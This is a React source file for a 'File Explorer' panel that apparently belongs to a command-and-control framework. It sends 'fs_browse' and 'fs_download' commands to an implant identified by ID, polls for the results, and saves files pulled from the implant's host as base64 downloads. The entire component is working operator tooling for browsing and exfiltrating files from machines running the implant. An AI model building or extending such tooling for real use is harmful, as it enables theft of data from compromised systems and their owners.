import React, { useState, useEffect, useCallback, useRef } from 'react';

const API_BASE = "/api";


const getEntryIcon = (isDir, fileName) => {
  if (isDir) return <span className="mr-2 text-yellow-500">📁</span>;
  const ext = fileName.split('.').pop()?.toLowerCase();
  switch (ext) {
    case 'txt': case 'md': return <span className="mr-2 text-gray-500">📄</span>;
    case 'jpg': case 'jpeg': case 'png': case 'gif': return <span className="mr-2 text-blue-500">🖼️</span>;
    case 'pdf': return <span className="mr-2 text-red-500">📄</span>;
    case 'zip': case 'tar': case 'gz': return <span className="mr-2 text-purple-500">📦</span>;
    case 'exe': case 'app': case 'dmg': return <span className="mr-2 text-green-600">⚙️</span>;
    default: return <span className="mr-2 text-gray-400">📄</span>;
  }
};

const formatSize = (bytes) => {
  if (bytes === 0 && typeof bytes === 'number') return '0 Bytes';
  if (!bytes || typeof bytes !== 'number') return '---';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
};


function FileSystemExplorer({ implantID, onClose, displayNotification }) {
  const [currentPath, setCurrentPath] = useState("__ROOTS__");
  const [loadedPath, setLoadedPath] = useState(null); 
  const [isInitiallyLoading, setIsInitiallyLoading] = useState(true);
  const [isManuallyRefreshing, setIsManuallyRefreshing] = useState(false);
  const [entries, setEntries] = useState([]);
  const [error, setError] = useState(null);
  const [activePollId, setActivePollId] = useState(null);
  const [downloadingFile, setDownloadingFile] = useState(null);
  const [lastUpdateTime, setLastUpdateTime] = useState(null);

  const pollIntervalRef = useRef(null);
  const isMountedRef = useRef(true);
  const pathUpdateFromPoll = useRef(false);

  const token = localStorage.getItem("token");

  

  const sendBrowseCommand = useCallback(async (path, isPathChangeOperation = true) => {
    
    
    if (isPathChangeOperation) {
      setEntries([]); 
      setIsInitiallyLoading(true); 
      setIsManuallyRefreshing(false); 
      setError(null);
    } else { 
      
      
      setIsManuallyRefreshing(true);
      setIsInitiallyLoading(false); 
      setError(null); 
    }

    const commandStr = `fs_browse {"path":"${path.replace(/\\/g, '\\\\')}"}`;
    try {
      const res = await fetch(`${API_BASE}/send-command`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ implant_id: implantID, command: commandStr }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || `Failed to send browse command (status ${res.status})`);
      
      if (isMountedRef.current) {
        setActivePollId(data.command_id);
      }
    } catch (err) {
      console.error(`Error sending browse command:`, err);
      if (isMountedRef.current) {
        const errorMsg = `Browse request failed: ${err.message}`;
        setError(errorMsg);
        setLoadedPath(path); 
        if (isPathChangeOperation) setIsInitiallyLoading(false);
        setIsManuallyRefreshing(false);
        displayNotification(`Browse request for ${path} failed: ${err.message}`, "error");
      }
    }
  }, [implantID, token, displayNotification]);

  const sendDownloadCommand = useCallback(async (filePath, fileNameForDownload) => {
    
    
    
    
    
    
    

    
    const commandStr = `fs_download {"path":"${filePath.replace(/\\/g, '\\\\')}"}`;
    try {
      
      
      
      displayNotification(`Requesting download: ${fileNameForDownload}...`, "info");

      const res = await fetch(`${API_BASE}/send-command`, { 
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ implant_id: implantID, command: commandStr }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || `Failed to send download command (status ${res.status})`);

      if (isMountedRef.current) {
        setActivePollId(data.command_id); 
        setDownloadingFile({ path: filePath, commandId: data.command_id, name: fileNameForDownload });
      }
    } catch (err) {
      console.error(`Error sending download command:`, err);
      if (isMountedRef.current) {
        
        
        displayNotification(`Download request for ${fileNameForDownload} failed: ${err.message}`, "error");
      }
    }
  }, [implantID, token, displayNotification]);


  const pollForResult = useCallback(async (cmdIdToPoll) => {
    if (!cmdIdToPoll || !isMountedRef.current) return;

    const isDownloadPoll = downloadingFile && downloadingFile.commandId === cmdIdToPoll;

    try {
      const res = await fetch(`${API_BASE}/implants/${implantID}/commands`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      if (!isMountedRef.current) return;
      if (!res.ok) { /* Handle network error during poll if needed, maybe retry */ return; }

      const data = await res.json();
      const cmd = data.commands?.find(c => c.id === cmdIdToPoll);

      if (cmd && cmd.id === activePollId) {
        if (cmd.status === 'executed') {
          setActivePollId(null); 
          setLastUpdateTime(new Date());

          if (isDownloadPoll) {
            
            if (cmd.output.startsWith("file_data_b64:")) {
                const base64Data = cmd.output.substring("file_data_b64:".length);
                try {
                    const byteCharacters = atob(base64Data);
                    const byteNumbers = new Array(byteCharacters.length);
                    for (let i = 0; i < byteCharacters.length; i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
                    const byteArray = new Uint8Array(byteNumbers);
                    const blob = new Blob([byteArray], { type: 'application/octet-stream' }); 
                    const link = document.createElement('a');
                    link.href = URL.createObjectURL(blob);
                    link.download = downloadingFile.name || 'downloaded_file';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    URL.revokeObjectURL(link.href);
                    displayNotification(`Downloaded: ${downloadingFile.name}`, "success");
                } catch (e) {
                    displayNotification(`Error processing file ${downloadingFile.name}: ${e.message}`, "error");
                }
            } else {
                displayNotification(`Download error for ${downloadingFile.name}: ${cmd.output}`, "error");
            }
            setDownloadingFile(null);
            
          } else { 
            setIsInitiallyLoading(false); 
            setIsManuallyRefreshing(false); 
            try {
              const listing = JSON.parse(cmd.output);
              if (listing.error) {
                setError(listing.error);
                setEntries([]); 
                displayNotification(`Browse error for ${listing.requested_path}: ${listing.error}`, "error");
                setLoadedPath(listing.requested_path); 
              } else {
                setEntries(listing.entries || []);
                setError(null);
                setLoadedPath(listing.requested_path); 
                if (listing.requested_path !== currentPath) {
                  pathUpdateFromPoll.current = true;
                  setCurrentPath(listing.requested_path); 
                }
              }
            } catch (e) {
              setError("Unparsable data from implant.");
              setEntries([]);
              displayNotification("Error: Unparsable data for listing.", "error");
              
              
              setLoadedPath(currentPath);
            }
          }
        } else if (cmd.status === 'pending') {
          
          
          
          
        } else { 
          setActivePollId(null);
          const errorMsg = `Command error for ${cmd.id.substring(0,8)} (${cmd.status}): ${cmd.output || 'No output'}`;
          displayNotification(isDownloadPoll ? `Download ${downloadingFile?.name || 'file'} failed: ${errorMsg}` : `Browse failed: ${errorMsg}`, "error");
          
          if (isDownloadPoll) {
            setDownloadingFile(null);
          } else { 
            setError(errorMsg);
            setEntries([]);
            setIsInitiallyLoading(false);
            setIsManuallyRefreshing(false);
            setLoadedPath(currentPath); 
          }
        }
      }
    } catch (err) {
      console.error("Unhandled error polling for result:", err);
      if (isMountedRef.current) {
        
        
        setIsInitiallyLoading(false); 
        setIsManuallyRefreshing(false); 
      }
    }
  }, [implantID, token, displayNotification, downloadingFile, activePollId, currentPath]); 

  
  useEffect(() => {
    isMountedRef.current = true;

    if (pathUpdateFromPoll.current) {
      pathUpdateFromPoll.current = false; 
      return;
    }

    
    
    
    
    if ((currentPath !== loadedPath || loadedPath === null) && !activePollId && isMountedRef.current) {
        sendBrowseCommand(currentPath, true); 
    }

    return () => { isMountedRef.current = false; };
  }, [currentPath, loadedPath, activePollId, sendBrowseCommand]); 
                                                                   
                                                                   

  
  useEffect(() => {
    if (activePollId && isMountedRef.current) {
      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
      pollForResult(activePollId); 
      pollIntervalRef.current = setInterval(() => {
        if (isMountedRef.current && activePollId) {
          pollForResult(activePollId);
        } else if (pollIntervalRef.current) {
          clearInterval(pollIntervalRef.current);
        }
      }, 2000);
    } else {
      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
    }
    return () => { if (pollIntervalRef.current) clearInterval(pollIntervalRef.current); };
  }, [activePollId, pollForResult]); 

  const handleEntryClick = (entry) => {
    if (activePollId || downloadingFile) {
        displayNotification("Operation in progress...", "info");
        return;
    }
    if (entry.is_dir) {
      if (currentPath !== entry.path) { 
        setCurrentPath(entry.path); 
      }
    } else {
      sendDownloadCommand(entry.path, entry.name);
    }
  };

  const handleUpDirectory = () => {
    if (activePollId || downloadingFile) {
        displayNotification("Operation in progress...", "info");
        return;
    }
    if (currentPath === "__ROOTS__") return;
    
    let parentPath;
    const isWindowsRoot = /^[A-Z]:\\?$/i.test(currentPath);
    const isUnixRoot = currentPath === "/";

    if (isWindowsRoot || isUnixRoot) {
        parentPath = "__ROOTS__";
    } else {
        const lastSeparatorIndex = Math.max(currentPath.lastIndexOf('/'), currentPath.lastIndexOf('\\'));
        if (lastSeparatorIndex > 0) {
            parentPath = currentPath.substring(0, lastSeparatorIndex);
            if (/^[A-Z]:$/.test(parentPath) && currentPath.includes(":\\")) { 
                parentPath += "\\";
            }
        } else if (lastSeparatorIndex === 0 && currentPath.length > 1) {
            parentPath = currentPath.substring(0, 1); 
        } else {
            parentPath = "__ROOTS__"; 
        }
    }
    if (currentPath !== parentPath) { 
        setCurrentPath(parentPath); 
    }
  };

  const handleManualRefresh = () => {
    if (activePollId || downloadingFile) {
        displayNotification("Operation in progress...", "info");
        return;
    }
    displayNotification(`Refreshing ${currentPath === "__ROOTS__" ? "Roots" : currentPath}...`, "info", 2000);
    
    
    
    
    
    sendBrowseCommand(currentPath, false); 
  };

  
  
  

  return (
    <div className="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-sm flex items-center justify-center p-2 sm:p-4 z-[120]" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="bg-gray-800 text-gray-200 rounded-lg shadow-2xl p-3 md:p-6 w-full max-w-xl md:max-w-3xl lg:max-w-4xl h-[85vh] md:h-[90vh] flex flex-col">
        <div className="flex justify-between items-center mb-3 md:mb-4">
          <h3 className="text-lg md:text-xl font-semibold">File Explorer: <span className="font-mono text-sm text-blue-400">{implantID}</span></h3>
          <div className="flex items-center">
            {/* Spinner for manual refresh */}
            {isManuallyRefreshing && !isInitiallyLoading && ( 
                <div className="w-4 h-4 border-2 border-blue-400 border-t-transparent rounded-full animate-spin mr-3"></div>
            )}
             {lastUpdateTime && !isManuallyRefreshing && !isInitiallyLoading && !error && (
                <span className="text-xs text-gray-400 mr-3 italic hidden sm:block">
                    Updated: {lastUpdateTime.toLocaleTimeString()}
                </span>
            )}
            <button
                onClick={handleManualRefresh}
                disabled={isManuallyRefreshing || isInitiallyLoading || !!activePollId || !!downloadingFile}
                className="p-1 text-gray-400 hover:text-gray-200 disabled:opacity-50 mr-2"
                title="Refresh current directory"
            >
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                    <path fillRule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clipRule="evenodd" />
                </svg>
            </button>
            <button onClick={onClose} className="text-gray-400 hover:text-gray-200 p-1 -mr-1">
              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-5 h-5 md:w-6 md:h-6">
                <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>
        </div>

        <div className="mb-2 md:mb-3 p-2 bg-gray-700 rounded text-xs md:text-sm path-display-container custom-scrollbar">
          <span className="font-semibold">Path: </span>
          <span className="font-mono text-green-400">{currentPath === "__ROOTS__" ? "Roots" : currentPath}</span>
        </div>
        
        <div className="mb-2 md:mb-3">
            <button
                onClick={handleUpDirectory}
                disabled={isInitiallyLoading || isManuallyRefreshing || !!activePollId || !!downloadingFile || currentPath === "__ROOTS__"}
                className="px-3 py-1.5 text-xs md:text-sm bg-blue-600 hover:bg-blue-700 rounded disabled:bg-gray-600 disabled:opacity-50 disabled:cursor-not-allowed"
            >
                Up (..)
            </button>
        </div>

        {/* Main loading state for path changes / initial load */}
        {isInitiallyLoading && (
          <div className="text-center py-10 flex-grow flex flex-col justify-center items-center">
            Loading entries for {currentPath === "__ROOTS__" ? "Roots" : currentPath}...
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-400 mx-auto mt-2"></div>
          </div>
        )}
        
        {/* Error display, shown if not initial loading */}
        {error && !isInitiallyLoading && (
          <div className="text-center py-10 text-red-400 flex-grow flex flex-col justify-center items-center">Error: {error}</div>
        )}
        
        {/* Empty directory message, shown if no initial load, no error, and no entries */}
        {!isInitiallyLoading && !error && entries.length === 0 && (
          <div className="text-center py-10 text-gray-400 flex-grow flex flex-col justify-center items-center">Directory is empty or not accessible.</div>
        )}

        {/* Entries table, shown if not initial load, no error, and entries exist */}
        {/* Added !error condition for showing table */}
        {!isInitiallyLoading && !error && entries.length > 0 && (
          <div className={`flex-grow overflow-auto border border-gray-700 rounded bg-gray-900/50 p-0.5 md:p-1 custom-scrollbar ${isManuallyRefreshing ? 'opacity-75' : ''}`}> 
            <table className="w-full text-xs md:text-sm table-fixed">
              <thead className="sticky top-0 bg-gray-700 z-10">
                <tr>
                  <th className="p-1.5 md:p-2 text-left font-semibold w-[45%] sm:w-2/5">Name</th>
                  <th className="p-1.5 md:p-2 text-left font-semibold hidden md:table-cell w-[15%] sm:w-1/5">Size</th>
                  <th className="p-1.5 md:p-2 text-left font-semibold hidden sm:table-cell w-[25%] sm:w-1/5">Modified</th>
                  <th className="p-1.5 md:p-2 text-left font-semibold w-[15%] sm:w-1/5">Permissions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700/50">
                {entries.sort((a,b) => {
                    if (a.is_dir && !b.is_dir) return -1;
                    if (!a.is_dir && b.is_dir) return 1;
                    return a.name.localeCompare(b.name);
                }).map((entry) => (
                  <tr 
                    key={entry.path || `${currentPath}_${entry.name}_${entry.is_dir}`} 
                    className={`hover:bg-gray-700/80 ${(entry.is_dir && !(activePollId || downloadingFile || isInitiallyLoading || isManuallyRefreshing)) ? 'cursor-pointer' : 'cursor-default'}`}
                    onClick={() => entry.is_dir && !(isInitiallyLoading || isManuallyRefreshing) && handleEntryClick(entry)}
                    title={entry.is_dir ? `Browse: ${entry.name}` : `File: ${entry.name}`}
                  >
                    <td className="p-1.5 md:p-2 whitespace-nowrap overflow-hidden text-ellipsis">
                      <div className="flex items-center">
                        {getEntryIcon(entry.is_dir, entry.name)}
                        <span className="flex-grow overflow-hidden text-ellipsis" title={entry.name}>{entry.name}</span>
                        {!entry.is_dir && (
                          <button 
                            onClick={(e) => { e.stopPropagation(); handleEntryClick(entry); }}
                            disabled={!!downloadingFile || !!activePollId || isInitiallyLoading || isManuallyRefreshing}
                            className="ml-auto flex-shrink-0 p-1 text-blue-400 hover:text-blue-300 disabled:text-gray-500 disabled:cursor-not-allowed"
                            title={`Download ${entry.name}`}
                          >
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-4 h-4 md:w-5 md:h-5">
                              <path strokeLinecap="round" strokeLinejoin="round" d="M3 16.5v2.25A2.25 2.25 0 005.25 21h13.5A2.25 2.25 0 0021 18.75V16.5M16.5 12L12 16.5m0 0L7.5 12m4.5 4.5V3" />
                            </svg>
                          </button>
                        )}
                      </div>
                    </td>
                    <td className="p-1.5 md:p-2 whitespace-nowrap hidden md:table-cell">{entry.is_dir ? '---' : formatSize(entry.size)}</td>
                    <td className="p-1.5 md:p-2 whitespace-nowrap hidden sm:table-cell">{entry.is_dir ? '---' : (entry.mod_time ? new Date(entry.mod_time * 1000).toLocaleString() : '---')}</td>
                    <td className="p-1.5 md:p-2 whitespace-nowrap font-mono text-xs">{entry.permissions || '---'}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}

export default FileSystemExplorer;